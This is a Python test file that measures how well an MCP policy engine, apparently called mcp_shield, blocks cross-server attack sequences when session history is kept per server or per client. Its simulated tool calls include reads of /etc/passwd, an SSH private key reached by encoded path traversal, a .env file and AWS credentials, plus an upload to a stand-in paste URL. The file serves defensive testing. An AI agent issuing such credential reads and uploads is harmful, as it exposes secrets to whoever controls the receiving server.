"""
Condition A (Isolated Tracking):
  SessionState is keyed strictly by `server_id`. When an attack sequence
  (e.g., read -> read -> sample) spans multiple servers, each server only
  sees its local slice of the history.

Condition B (Unified Tracking):
  SessionState is keyed by `client_session_id`. All tool calls and resource
  reads across all servers in the deployment are appended to a single, unified
  history log.

Every case runner follows the same three-step contract regardless of whether
it does a store.clear() mid-scenario (MPS-029) or not:
  1. All engine.evaluate() calls run inside a single asyncio.run() scope on
     the event loop that owns the DB connection — no threads, no nested loops.
  2. _drain_tasks() is awaited BEFORE store.clear() so SQLite has the rows
     before in-memory state is wiped.
  3. _drain_tasks() is awaited again before returning so the _run_condition()
     finally block can safely close the DB.
"""

import asyncio
import os
import uuid
import pytest

from mcp_shield.src.policy import PolicyEngine
from mcp_shield.src.session import SessionState, SessionStore
from mcp_shield.src.schemas import JSONRPCRequest
from mcp_shield.src.database import DatabaseManager

async def _make_db_store_async(db_path: str) -> tuple[SessionStore, DatabaseManager]:
    """Create a DB-backed SessionStore. Returns (store, db) for teardown."""
    if os.path.exists(db_path):
        os.remove(db_path)
    db = DatabaseManager(db_path=db_path)
    await db.init_db()
    store = SessionStore(db_manager=db)
    return store, db


async def _get_session(store: SessionStore, session_id: str) -> SessionState:
    """Tiny await gap so record_call write tasks can flush, then fetch/create."""
    await asyncio.sleep(0.02)
    return await store.get_or_create(session_id)


async def _drain_tasks() -> None:
    """Give the event loop enough cycles to flush all pending aiosqlite write tasks."""
    await asyncio.sleep(0.05)

CASES = [
    ("MPS-029", "Gradual escalation",                     2),
    ("MPS-043", "Data staging via sampling",              3),
    ("MPS-044", "Read then external upload",              1),
    ("MPS-047", "Below window size (14-read)",           14),
    ("MPS-050", "Multi-server data read sequence",        2),
    ("MPS-052", "Filesystem write-after-read",            1),
    ("MPS-060", "Session history cap boundary (20-read)", 20),
    ("MPS-063", "Rate-limit probe (scrambled order)",     5),
    ("MPS-064", "Sequential sampling context buildup",    2),
    ("MPS-065", "Resource-to-sampling exfiltration",      2),
    ("MPS-067", "Sampling after tool sequence",           3),
    ("MPS-069", "Slow-burn sampling (10-read)",          10),
    ("MPS-076", "Encoded traversal to SSH key",           2),
    ("MPS-077", "Sensitive read hidden among docs",       2),
    ("MPS-079", "Tool pipeline on cloud credentials",     3),
]


def _sid(base: str) -> str:
    """Unique session ID per asyncio.run() scope, prevents history bleeding."""
    return f"{base}-{uuid.uuid4().hex[:8]}"


def _req(method: str, params: dict | None = None) -> JSONRPCRequest:
    return JSONRPCRequest(jsonrpc="2.0", id=1, method=method, params=params or {})

async def _simulate_cross_server_attack(
    engine: PolicyEngine,
    store: SessionStore,
    case_id: str,
    read_count: int,
    condition: str,
) -> bool:
    """
    Cross-server layout:
      - Server A (compromised) performs preceding resource reads / tool calls.
      - Server B (target/pivoted server) performs the sampling or target tool call.
    """

    session_id_A = "serverA"               if condition == "A" else "global_client_session"
    session_id_B = "serverB"               if condition == "A" else "global_client_session"
    session_A = await _get_session(store, session_id_A)
    session_A.verified_capabilities = ["resources", "sampling", "tools"]
    if condition == "B":
        session_A.server_id = "serverA"

    if case_id == "MPS-052":
        # Write-after-read pattern on filesystem-server
        session_A.server_id = "filesystem-server"
        req_read = _req("tools/call", {"name": "read_file", "arguments": {"path": "/etc/passwd"}})
        engine.evaluate(req_read, session_A)

        await _drain_tasks()
        session_B = await _get_session(store, session_id_B)
        session_B.verified_capabilities = ["resources", "sampling", "tools"]
        session_B.server_id = "filesystem-server"
        req_write = _req("tools/call", {"name": "write_file", "arguments": {"path": "/tmp/out.txt"}})
        result = engine.evaluate(req_write, session_B)
        await _drain_tasks()
        return not result.allowed

    elif case_id in ("MPS-063",):
        # 6 rapid tool calls: 5 on Server A, 6th on Server B
        tools = ["read_file", "write_file", "list_directory", "read_file", "write_file"]
        for tool in tools:
            engine.evaluate(_req("tools/call", {"name": tool, "arguments": {}}), session_A)
        await _drain_tasks()
        session_B = await _get_session(store, session_id_B)
        session_B.verified_capabilities = ["resources", "sampling", "tools"]
        result = engine.evaluate(_req("tools/call", {"name": "list_directory", "arguments": {}}), session_B)
        await _drain_tasks()
        return not result.allowed

    elif case_id == "MPS-064":
        # 3 sampling calls: 2 on Server A, 3rd on Server B
        engine.evaluate(_req("sampling/createMessage", {}), session_A)
        engine.evaluate(_req("sampling/createMessage", {}), session_A)
        await _drain_tasks()
        session_B = await _get_session(store, session_id_B)
        session_B.verified_capabilities = ["resources", "sampling", "tools"]
        result = engine.evaluate(_req("sampling/createMessage", {}), session_B)
        await _drain_tasks()
        return not result.allowed

    elif case_id == "MPS-067":
        # Tool sequence then sampling: 3 tool calls on Server A, sampling on Server B
        for tool in ["get_data", "format_data", "analyze"]:
            engine.evaluate(_req("tools/call", {"name": tool, "arguments": {}}), session_A)
        await _drain_tasks()
        session_B = await _get_session(store, session_id_B)
        session_B.verified_capabilities = ["resources", "sampling", "tools"]
        result = engine.evaluate(_req("sampling/createMessage", {}), session_B)
        await _drain_tasks()
        return not result.allowed

    elif case_id == "MPS-044":
        # Read on Server A, write to an external URL on Server B (filesystem-server rule)
        session_A.server_id = "filesystem-server"
        engine.evaluate(_req("tools/call", {"name": "read_file", "arguments": {"path": "docs/quarterly_report.md"}}), session_A)
        await _drain_tasks()
        session_B = await _get_session(store, session_id_B)
        session_B.verified_capabilities = ["resources", "sampling", "tools"]
        session_B.server_id = "filesystem-server"
        result = engine.evaluate(_req("tools/call", {"name": "write_file", "arguments": {"path": "https://paste.example.com/api/upload"}}), session_B)
        await _drain_tasks()
        return not result.allowed

    elif case_id in ("MPS-076", "MPS-077"):
        # Two resource reads on Server A (one sensitive), sampling on Server B
        uris = {
            "MPS-076": ["file:///home/dev/project/docs/%2e%2e/%2e%2e/.ssh/id_rsa", "file:///home/dev/project/README.md"],
            "MPS-077": ["file:///workspace/docs/api_v1.md", "file:///workspace/.env"],
        }[case_id]
        for uri in uris:
            engine.evaluate(_req("resources/read", {"uri": uri}), session_A)
        await _drain_tasks()
        session_B = await _get_session(store, session_id_B)
        session_B.verified_capabilities = ["resources", "sampling", "tools"]
        result = engine.evaluate(_req("sampling/createMessage", {}), session_B)
        await _drain_tasks()
        return not result.allowed

    elif case_id == "MPS-079":
        # Tool pipeline over cloud credentials on Server A, sampling on Server B
        for tool, args in [("get_data", {"source": "~/.aws/credentials"}),
                           ("format_data", {"format": "table"}),
                           ("analyze", {"metric": "summary"})]:
            engine.evaluate(_req("tools/call", {"name": tool, "arguments": args}), session_A)
        await _drain_tasks()
        session_B = await _get_session(store, session_id_B)
        session_B.verified_capabilities = ["resources", "sampling", "tools"]
        result = engine.evaluate(_req("sampling/createMessage", {}), session_B)
        await _drain_tasks()
        return not result.allowed

    else:
        # Resource reads followed by sampling
        for i in range(read_count):
            engine.evaluate(_req("resources/read", {"name": f"file{i}.txt"}), session_A)

        await _drain_tasks()

        session_B = await _get_session(store, session_id_B)
        session_B.verified_capabilities = ["resources", "sampling", "tools"]

        result = engine.evaluate(_req("sampling/createMessage", {}), session_B)
        await _drain_tasks()
        return not result.allowed

def run_ablation() -> dict:
    results = {}

    for case_id, desc, read_count in CASES:
        engine = PolicyEngine("config/shield_config.json")

        run_id    = uuid.uuid4().hex[:8]
        db_path_A = f"ablation_condA_{case_id}_{run_id}.db"
        db_path_B = f"ablation_condB_{case_id}_{run_id}.db"

        async def _run_condition(
            db_path: str,
            condition: str,
            _engine: PolicyEngine = engine,
            _case_id: str = case_id,
            _read_count: int = read_count,
        ) -> bool:
            store, db = await _make_db_store_async(db_path)
            try:
                return await _simulate_cross_server_attack(
                    _engine, store, _case_id, _read_count, condition
                )
            finally:
                await _drain_tasks()
                await db.close()
                if os.path.exists(db_path):
                    os.remove(db_path)

        blocked_A = asyncio.run(_run_condition(db_path_A, "A"))
        blocked_B = asyncio.run(_run_condition(db_path_B, "B"))

        results[case_id] = {"desc": desc, "A": blocked_A, "B": blocked_B}

    return results


def print_results(results: dict):
    print("\n" + "=" * 80)
    print(" CROSS-SERVER ATTACK ABLATION: ISOLATED VS. UNIFIED SESSION TRACKING")
    print("=" * 80)
    print(f"{'Case ID':<10} {'Description':<35} {'Cond A (Isolated)':<20} {'Cond B (Unified)':<20}")
    print("-" * 80)

    total           = len(results)
    blocked_A_count = 0
    blocked_B_count = 0

    for case_id, data in results.items():
        val_A = "BLOCKED" if data["A"] else "missed"
        val_B = "BLOCKED" if data["B"] else "missed"
        if data["A"]: blocked_A_count += 1
        if data["B"]: blocked_B_count += 1
        print(f"{case_id:<10} {data['desc']:<35} {val_A:<20} {val_B:<20}")

    print("-" * 80)

    asr_A = (total - blocked_A_count) / total * 100
    asr_B = (total - blocked_B_count) / total * 100

    print(f"{'Attack Success Rate (ASR)':<46} {asr_A:.1f}%                 {asr_B:.1f}%")
    print(f"{'Detection Rate':<46} {blocked_A_count/total*100:.1f}%                {blocked_B_count/total*100:.1f}%")
    print("=" * 80 + "\n")
    print("  Condition A: Session history is siloed per server (current default behavior)")
    print("  Condition B: Session history is aggregated per client across all servers")
    print()


# ---------------------------------------------------------------------------
# pytest integration
# ---------------------------------------------------------------------------

@pytest.fixture(scope="module")
def ablation_results():
    return run_ablation()


def test_condition_A_isolated_tracking_misses_cross_server(ablation_results):
    for case_id in ablation_results:
        assert not ablation_results[case_id]["A"], f"Condition A should MISS {case_id}"


def test_condition_B_unified_tracking_catches_cross_server(ablation_results):
    for case_id in ablation_results:
        assert ablation_results[case_id]["B"], f"Condition B should BLOCK {case_id}"


def test_print_ablation_results(ablation_results):
    print_results(ablation_results)


if __name__ == "__main__":
    res = run_ablation()
    print_results(res)